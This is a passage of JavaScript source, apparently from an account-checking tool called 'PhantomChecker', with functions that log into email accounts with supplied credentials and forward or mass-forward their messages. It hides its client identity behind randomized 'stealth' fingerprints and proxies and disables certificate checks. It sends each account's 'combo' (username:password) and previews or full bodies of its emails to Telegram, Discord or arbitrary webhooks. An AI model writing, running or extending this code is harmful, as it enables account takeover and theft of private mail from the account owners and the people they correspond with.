        client.removeAllListeners('error');
        client.on('error', () => {});
      } catch {}
      try {
        if (client.socket && !client.socket.destroyed) {
          client.socket.destroy();
        }
      } catch {}
      try { client.close(); } catch {}
    }
    if (customSocket) {
      try { customSocket.destroy(); } catch {}
    }
  }
}

/**
 * Forward or Reply to email via SMTP and append to IMAP Sent folder
 */
export async function forwardRealEmail({
  host,
  port = 993,
  smtpHost,
  smtpPort = 587,
  user,
  pass,
  to,
  cc = '',
  bcc = '',
  subject,
  note = '',
  origBodyText = '',
  origBodyHtml = '',
  origSender = '',
  origDate = '',
  messageId = '',
  isReply = false,
  attachments = [],
  proxy = null,
  skipImapAppend = false
}) {
  const isReplyMode = isReply || (subject && subject.trim().startsWith('Re:'));
  
  // Format standardized subject
  let finalSubject = subject || (isReplyMode ? 'Re: Message' : 'Fwd: Message');
  if (isReplyMode) {
    if (!finalSubject.startsWith('Re:')) finalSubject = `Re: ${finalSubject}`;
  } else {
    if (!finalSubject.startsWith('Fwd:')) finalSubject = `Fwd: ${finalSubject}`;
  }

  // Format Plaintext and HTML body
  const fullText = isReplyMode
    ? `${note ? note + '\n\n' : ''}On ${origDate || 'earlier message'}, ${origSender || 'sender'} wrote:\n> ${(origBodyText || '').replace(/\n/g, '\n> ')}`
    : `${note ? note + '\n\n' : ''}---------- Forwarded message ---------\nFrom: ${origSender || user}\nTo: ${to}\nDate: ${origDate || new Date().toLocaleString()}\nSubject: ${subject}\n\n${origBodyText}`;

  const fullHtml = isReplyMode
    ? `<div>
        ${note ? `<div style="font-family: Arial, sans-serif; font-size: 14px; margin-bottom: 18px; padding: 12px; background: #f0fdf4; border-left: 4px solid #00ff9d; color: #166534;">${note.replace(/\n/g, '<br/>')}</div>` : ''}
        <div style="font-size: 12px; color: #64748b; margin-top: 14px; margin-bottom: 8px;">
          On ${origDate || 'earlier message'}, <strong>${origSender || 'sender'}</strong> wrote:
        </div>
        <blockquote style="margin: 0; padding-left: 14px; border-left: 2px solid #cbd5e1; color: #475569;">
          ${origBodyHtml || `<pre style="font-family: monospace; white-space: pre-wrap; margin: 0;">${origBodyText}</pre>`}
        </blockquote>
      </div>`
    : `<div>
        ${note ? `<div style="font-family: Arial, sans-serif; font-size: 14px; margin-bottom: 20px; padding: 12px; background: #f0fdf4; border-left: 4px solid #00ff9d; color: #166534;">${note.replace(/\n/g, '<br/>')}</div>` : ''}
        <div style="font-size: 12px; color: #64748b; border-top: 1px solid #e2e8f0; padding-top: 12px; margin-bottom: 16px;">
          <strong>---------- Forwarded message ---------</strong><br/>
          <strong>From:</strong> ${origSender || user}<br/>
          <strong>To:</strong> ${to}<br/>
          <strong>Date:</strong> ${origDate || new Date().toLocaleString()}<br/>
          <strong>Subject:</strong> ${subject}
        </div>
        ${origBodyHtml || `<pre style="font-family: monospace; white-space: pre-wrap;">${origBodyText}</pre>`}
      </div>`;

  let smtpSuccess = false;
  let smtpError = null;

  const stealth = getRandomStealthClient();

  if (user && pass && to) {
    try {
      const nodemailerModule = await import('nodemailer');
      const nodemailer = nodemailerModule.default || nodemailerModule;
      
      const transportOptions = {
        host: smtpHost || `smtp.${user.split('@')[1]}`,
        port: Number(smtpPort) || 587,
        secure: Number(smtpPort) === 465,
        auth: { user, pass },
        tls: {
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        },
        connectionTimeout: 8000,
        greetingTimeout: 5000,
        socketTimeout: 8000
      };

      const transporter = nodemailer.createTransport(transportOptions);

      const mailOptions = {
        from: user,
        to,
        ...(cc ? { cc } : {}),
        ...(bcc ? { bcc } : {}),
        subject: finalSubject,
        text: fullText,
        html: fullHtml,
        headers: {
          'User-Agent': stealth.userAgent,
          'X-Mailer': `${stealth.name} ${stealth.version}`,
          ...(isReplyMode && messageId ? { 'In-Reply-To': messageId, 'References': messageId } : {})
        },
        ...(Array.isArray(attachments) && attachments.length > 0 ? { attachments } : {})
      };

      await transporter.sendMail(mailOptions);
      smtpSuccess = true;
    } catch (err) {
      smtpError = err.message;
    }
  }

  let imapSaved = false;
  let customSocket = null;
  let imapClient = null;
  if (!skipImapAppend && smtpSuccess) {
    try {
      if (proxy && proxy.host && proxy.port) {
        try {
          customSocket = await createProxiedSocket({
            targetHost: host,
            targetPort: Number(port) || 993,
            proxy,
            timeout: 8000,
            secure: true
          });
        } catch {}
      }

      imapClient = new ImapFlow({
        host,
        port: Number(port) || 993,
        secure: true,
        auth: { user, pass },
        logger: false,
        connectionTimeout: 8000,
        tls: {
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        },
        clientInfo: {
          name: stealth.name,
          version: stealth.version,
          vendor: stealth.vendor,
          'support-url': stealth.supportUrl
        },
        ...(customSocket ? { socket: customSocket } : {})
      });
      imapClient.on('error', () => {});
      await imapClient.connect();

      const mailboxes = await imapClient.list();
      const sentBox = mailboxes.find(b => 
        b.specialUse === '\\Sent' || 
        /^(sent|éléments envoyés|gesendete|enviados|inviati)/i.test(b.path) || 
        b.path.toLowerCase().includes('sent') || 
        b.path.toLowerCase().includes('envoy')
      );

      if (sentBox) {
        const generatedMsgId = `<${Date.now()}.${Math.random().toString(36).substring(2)}@${user.split('@')[1] || 'phantom.local'}>`;
        const rawRfc822 = [
          `From: <${user}>`,
          `To: <${to}>`,
          ...(cc ? [`Cc: <${cc}>`] : []),
          `Subject: ${finalSubject}`,
          `Date: ${new Date().toUTCString()}`,
          `Message-ID: ${generatedMsgId}`,
          ...(isReplyMode && messageId ? [`In-Reply-To: ${messageId}`, `References: ${messageId}`] : []),
          `MIME-Version: 1.0`,
          `Content-Type: text/html; charset=utf-8`,
          `X-Mailer: ${stealth.name} ${stealth.version}`,
          '',
          fullHtml
        ].join('\r\n');

        await imapClient.append(sentBox.path, Buffer.from(rawRfc822), ['\\Seen']);
        imapSaved = true;
      }
      if (imapClient.authenticated) await imapClient.logout();
    } catch { /* Non-fatal: SMTP delivery already completed */ } finally {
      if (imapClient) {
        try {
          imapClient.removeAllListeners('error');
          imapClient.on('error', () => {});
        } catch {}
        try {
          if (imapClient.socket && !imapClient.socket.destroyed) imapClient.socket.destroy();
        } catch {}
        try { imapClient.close(); } catch {}
      }
      if (customSocket) {
        try { customSocket.destroy(); } catch {}
      }
    }
  }

  return {
    success: smtpSuccess,
    mode: isReplyMode ? 'reply' : 'forward',
    smtpDelivered: smtpSuccess,
    imapAppended: imapSaved,
    recipient: to,
    subject: finalSubject,
    fullText,
    fullHtml,
    warning: smtpError ? `SMTP notice: ${smtpError}` : null
  };
}

/**
 * Mass Forward multiple emails to multiple recipients or webhook/relay
 */
export async function massForwardRealEmails({
  host,
  port = 993,
  smtpHost,
  smtpPort = 587,
  user,
  pass,
  recipients = [],
  webhookUrl = '',
  messages = [],
  note = '',
  proxy = null
}) {
  const cleanRecipients = Array.isArray(recipients)
    ? recipients.map(r => String(r).trim()).filter(Boolean)
    : String(recipients || '').split(/[\n,;]+/).map(r => r.trim()).filter(Boolean);

  const results = {
    totalMessages: messages.length,
    totalRecipients: cleanRecipients.length,
    successCount: 0,
    failedCount: 0,
    dispatched: [],
    webhookDispatched: false,
    errors: []
  };

  // 1. Webhook Relay Dispatch (No SMTP required!)
  if (webhookUrl && webhookUrl.trim().startsWith('http')) {
    try {
      const trimmedUrl = webhookUrl.trim();
      let targetUrl = trimmedUrl;
      let bodyData;

      if (trimmedUrl.includes('api.telegram.org')) {
        // Telegram Bot URL format: https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>
        const urlObj = new URL(trimmedUrl);
        const chatId = urlObj.searchParams.get('chat_id');
        const escapeHtml = (str) => String(str || '').replace(/[<>&]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));
        const comboString = pass ? `${user}:${pass}` : user;
        const cleanCombo = escapeHtml(comboString);
        const cleanUser = escapeHtml(user || 'Unknown');
        const cleanNote = escapeHtml(note || 'Mass Forward Relay');

        let telegramText = `⚡ <b>PhantomChecker - Email Relay</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━\n` +
          `🔑 <b>Combo:</b> <code>${cleanCombo}</code>\n` +
          `📬 <b>Source:</b> <code>${cleanUser}</code>\n` +
          `📝 <b>Note:</b> ${cleanNote}\n` +
          `📊 <b>Total Emails:</b> ${messages.length}\n` +
          `⏰ <b>Timestamp:</b> ${new Date().toISOString()}\n\n`;

        messages.slice(0, 5).forEach((m, idx) => {
          const cleanSubj = String(m.subject || 'No Subject').replace(/[<>&]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));
          const cleanSndr = String(m.sender || m.origSender || m.senderEmail || 'Unknown').replace(/[<>&]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));
          const preview = String(m.bodyText || m.origBodyText || '').slice(0, 160).replace(/[<>&]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));
          telegramText += `▫️ <b>[${idx + 1}] ${cleanSubj}</b>\n   From: <code>${cleanSndr}</code>\n   ${preview}...\n\n`;
        });

        if (messages.length > 5) {
          telegramText += `<i>...and ${messages.length - 5} more email(s).</i>`;
        }

        bodyData = JSON.stringify({
          chat_id: chatId || undefined,
          text: telegramText,
          parse_mode: 'HTML'
        });
      } else if (trimmedUrl.includes('discord.com/api/webhooks')) {
        // Discord Webhook format
        const comboString = pass ? `${user}:${pass}` : user;
        bodyData = JSON.stringify({
          username: 'PhantomChecker Relay',
          embeds: [{
            title: `⚡ PhantomChecker - Relay (${messages.length} Emails)`,
            description: `**Combo:** \`${comboString}\`\n**Source:** \`${user}\`\n**Note:** ${note || 'Mass Forward Relay'}`,
            color: 0x00e5ff,
            fields: messages.slice(0, 5).map((m, idx) => ({
              name: `${idx + 1}. ${(m.subject || 'No Subject').slice(0, 60)}`,
              value: `From: \`${(m.sender || m.origSender || 'Unknown').slice(0, 40)}\`\n${(m.bodyText || m.origBodyText || '').slice(0, 140)}...`
            })),
            footer: { text: messages.length > 5 ? `+${messages.length - 5} more emails` : 'PhantomChecker v3.8' },
            timestamp: new Date().toISOString()
          }]
        });
      } else {
        // Generic Webhook JSON payload
        bodyData = JSON.stringify({
          sourceAccount: user,
          sourcePassword: pass || '',
          combo: pass ? `${user}:${pass}` : user,
          timestamp: new Date().toISOString(),
          note: note || 'PhantomChecker Mass Forward Relay',
          totalEmails: messages.length,
          emails: messages.map(m => ({
            subject: m.subject,
            from: m.sender || m.origSender || m.senderEmail,
            date: m.date || m.origDate,
            bodyText: m.bodyText || m.origBodyText,
            htmlBody: m.htmlBody || m.origBodyHtml,
            matchedTargets: m.matchedTargets || []
          }))
        });
      }

      const webhookRes = await fetch(targetUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: bodyData
      });
      results.webhookDispatched = webhookRes.ok;
      if (!webhookRes.ok) {
        const errText = await webhookRes.text().catch(() => '');
        results.errors.push(`Webhook HTTP ${webhookRes.status}: ${errText.slice(0, 120)}`);
      }
    } catch (whErr) {
      results.errors.push(`Webhook error: ${whErr.message}`);
    }
  }

  // 2. Email Forwarding Dispatch across all messages and recipients
  if (cleanRecipients.length > 0 && messages.length > 0) {
    let consecutiveAuthErrors = 0;
    for (const msg of messages) {
      if (consecutiveAuthErrors >= 2) {
        results.errors.push(`Aborted remaining forwards: SMTP server rejected credentials or blocked connection`);
        break;
      }
      for (const recipient of cleanRecipients) {
        try {
          const res = await forwardRealEmail({
            host,
            port,
            smtpHost,
            smtpPort,
            user,
            pass,
            to: recipient,
            subject: msg.subject ? (msg.subject.startsWith('Fwd:') ? msg.subject : `Fwd: ${msg.subject}`) : 'Fwd: Email Message',
            note,
            origBodyText: msg.bodyText || msg.origBodyText || '',
            origBodyHtml: msg.htmlBody || msg.origBodyHtml || '',
            origSender: msg.sender || msg.origSender || msg.senderEmail || '',
            origDate: msg.date || msg.origDate || '',
            messageId: msg.messageId || '',
            isReply: false,
            proxy,
            skipImapAppend: true
          });

          if (res.success) {
            consecutiveAuthErrors = 0;
            results.successCount++;
            results.dispatched.push({ recipient, subject: res.subject, smtpDelivered: true });
          } else {
            consecutiveAuthErrors++;
            results.failedCount++;
            results.errors.push(`Failed for ${recipient}: ${res.warning || 'SMTP delivery failed'}`);
          }
        } catch (fwdErr) {
          consecutiveAuthErrors++;
          results.failedCount++;
          results.errors.push(`Failed for ${recipient}: ${fwdErr.message}`);
        }
      }
    }
  }

  const hasSuccess = results.successCount > 0 || results.webhookDispatched;
  return {
    success: hasSuccess,
    ...results,
    error: !hasSuccess && results.errors.length > 0 ? results.errors[0] : null
  };
}

